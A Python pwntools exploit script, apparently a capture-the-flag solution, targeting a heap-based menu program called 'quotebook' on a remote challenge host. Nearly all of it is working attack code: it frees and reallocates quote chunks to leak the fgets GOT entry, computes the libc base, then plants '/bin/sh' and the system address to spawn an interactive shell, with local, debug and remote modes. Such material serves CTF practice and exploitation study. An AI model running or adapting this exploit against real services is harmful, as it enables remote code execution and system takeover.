#!/usr/bin/env python
"""Exploit script template."""
import subprocess
import sys

from pwn import *

context.log_level = 'info'

BINARY = './quotebook'
LIB = './libc.so.6'
HOST = 'challs.dvc.tf'
PORT = 2222

GDB_COMMANDS = ['b main']


MENU_1 = """
-:: Menu ::-
1- List quotes
2- Add a quote
3- Display a quote"""

MENU_2 = """4- Edit a quote
5- Delete a quote
6- Exit
Choice number > """


def list_quotes(p):
    p.sendlineafter(MENU_2, str(1))
    return p.recvuntil(MENU_1, drop=True)


def add_quote(p, title, content, title_length=None, content_length=None):
    title_length = len(title) if title_length == None else title_length
    content_length = len(content) if content_length == None else content_length

    p.sendlineafter(MENU_2, str(2))
    p.sendlineafter('Title size > ', str(title_length))
    p.sendlineafter('Content size > ', str(content_length))
    p.sendlineafter('Title > ', title)
    p.sendlineafter('Content > ', content)


def display_quote(p, index, wait_for_menu=True):
    p.sendlineafter(MENU_2, str(3))
    p.sendlineafter('Quote number > ', str(index))
    if wait_for_menu:
        return p.recvuntil(MENU_1, drop=True)


def edit_quote(p, index, content):
    p.sendlineafter(MENU_2, str(4))
    p.sendlineafter('Quote number > ', str(index))
    p.sendlineafter('Content > ', content)


def delete_quote(p, index):
    p.sendlineafter(MENU_2, str(5))
    p.sendlineafter('Quote number > ', str(index))


def exploit(p, mode, libc):
    """Exploit goes here."""
    for i in range(20):
        add_quote(p, "aaa" + str(i), "bbb" + str(i))

    delete_quote(p, 3)
    delete_quote(p, 4)
    delete_quote(p, 5)

    add_quote(p, p64(context.binary.got['fgets']), 'BB', title_length=0x30, content_length=0x30)

    leak = display_quote(p, 3).split(b'\n')[-1]
    leak = u64(leak[4:].ljust(8, b'\0'))

    libc.address = leak - libc.sym['fgets']

    assert libc.address & 0xfff == 0

    log.info(f'libc @ addr 0x{libc.address:x}')

    delete_quote(p, 8)
    delete_quote(p, 9)
    delete_quote(p, 10)

    payload = b'/bin/sh'.ljust(0x20, b'\0') + p64(libc.sym['system']) * 2
    add_quote(p, payload, 0x30*'B')

    display_quote(p, 8, wait_for_menu=False)

    p.interactive()



def main():
    """Does general setup and calls exploit."""
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <mode>')
        sys.exit(0)

    try:
        context.binary = ELF(BINARY)
    except IOError:
        print(f'Failed to load binary ({BINARY})')

    libc = None
    try:
        libc = ELF(LIB)
        env = os.environ.copy()
        env['LD_PRELOAD'] = LIB
    except IOError:
        print(f'Failed to load library ({LIB})')

    mode = sys.argv[1]

    if mode == 'local':
        p = remote('localhost', 2222)
    elif mode == 'debug':
        p = remote('localhost', 2223)
        gdb_cmd = [
            'tmux',
            'split-window',
            '-p',
            '75',
            'gdb',
            '-ex',
            'target remote localhost:2224',
        ]

        for cmd in GDB_COMMANDS:
            gdb_cmd.append('-ex')
            gdb_cmd.append(cmd)

        gdb_cmd.append(BINARY)

        subprocess.Popen(gdb_cmd)

    elif mode == 'remote':
        p = remote(HOST, PORT)
    else:
        print('Invalid mode')
        sys.exit(1)

    exploit(p, mode, libc)

if __name__ == '__main__':

    main()
